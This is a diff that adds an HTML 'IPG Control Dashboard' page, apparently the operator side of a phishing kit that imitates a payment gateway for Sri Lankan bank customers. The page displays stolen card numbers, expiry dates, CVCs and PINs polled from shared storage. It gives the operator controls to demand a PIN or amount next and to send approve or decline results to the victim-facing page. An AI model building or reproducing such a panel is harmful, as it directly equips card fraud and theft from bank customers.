@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="si">
+<head>
+    <meta charset="UTF-8">
+    <title>Advanced IPG Admin</title>
+    <style>
+        body { font-family: 'Inter', sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 20px; }
+        .dashboard { max-width: 1100px; margin: auto; }
+        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1e293b; padding-bottom: 15px; }
+        .grid { display: grid; grid-template-columns: 1fr 350px; gap: 20px; margin-top: 20px; }
+        .card { background: #1e293b; border-radius: 12px; padding: 20px; border: 1px solid #334155; }
+        h3 { margin-top: 0; color: #38bdf8; font-size: 18px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+        th { text-align: left; color: #94a3b8; font-size: 13px; padding: 10px; border-bottom: 1px solid #334155; }
+        td { padding: 12px 10px; font-size: 14px; border-bottom: 1px solid #0f172a; }
+        .status-dot { height: 10px; width: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }
+        .bg-green { background: #22c55e; } .bg-red { background: #ef4444; }
+        .control-item { margin-bottom: 15px; }
+        select, button { width: 100%; padding: 12px; border-radius: 8px; border: none; font-weight: bold; margin-top: 5px; }
+        select { background: #334155; color: white; }
+        .btn-update { background: #38bdf8; color: #0f172a; cursor: pointer; }
+        .btn-success { background: #22c55e; color: white; cursor: pointer; }
+        .btn-decline { background: #ef4444; color: white; cursor: pointer; }
+        .highlight { color: #fbbf24; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="dashboard">
+    <div class="header">
+        <h2>IPG Control Dashboard</h2>
+        <div id="liveStatus">
+            <span class="status-dot bg-green"></span> System Online
+        </div>
+    </div>
+
+    <div class="grid">
+        <div class="card">
+            <h3>📊 Live Transaction Logs</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Customer & Bank</th>
+                        <th>Card Details</th>
+                        <th>CVC</th>
+                        <th>PIN</th>
+                        <th>Debited Amount</th>
+                    </tr>
+                </thead>
+                <tbody id="adminTable">
+                    <tr><td colspan="5" style="text-align:center; color:#64748b;">No active transactions...</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="card">
+            <h3>⚙️ System Settings</h3>
+            <div class="control-item">
+                <label>Gateway Mode:</label>
+                <select id="gwStatus">
+                    <option value="unlock">🔓 UNLOCK (Active)</option>
+                    <option value="lock">🔒 LOCK (Disabled)</option>
+                </select>
+            </div>
+            <div class="control-item">
+                <label>Target Verification:</label>
+                <select id="nextStep">
+                    <option value="pin">Required PIN</option>
+                    <option value="credit">Required Debited Amount</option>
+                </select>
+            </div>
+            <button class="btn-update" onclick="updateSettings()">Apply Configuration</button>
+            
+            <h3 style="margin-top: 30px;">🎯 Action Result</h3>
+            <button class="btn-success" onclick="setFinal('success')">Approve Payment</button>
+            <div style="margin-top: 10px;"></div>
+            <button class="btn-decline" onclick="setFinal('decline')">Decline Payment</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    function updateSettings() {
+        localStorage.setItem('gwStatus', document.getElementById('gwStatus').value);
+        localStorage.setItem('nextStep', document.getElementById('nextStep').value);
+        alert("Settings Applied Successfully!");
+    }
+
+    function setFinal(res) {
+        localStorage.setItem('finalResult', res);
+        alert("Response Sent: " + res.toUpperCase());
+    }
+
+    setInterval(() => {
+        const data = JSON.parse(localStorage.getItem('userPayload') || '{}');
+        if(data.name) {
+            document.getElementById('adminTable').innerHTML = `
+                <tr>
+                    <td><b>${data.name}</b><br><small style="color:#94a3b8">${data.bank}</small></td>
+                    <td>${data.card}<br><small>${data.exp}</small></td>
+                    <td class="highlight">${data.cvc}</td>
+                    <td class="highlight">${data.pin || '-'}</td>
+                    <td class="highlight" style="color:#22c55e">${data.credit ? 'LKR ' + data.credit : '-'}</td>
+                </tr>`;
+        }
+    }, 1000);
+</script>
+
+</body>
+</html>
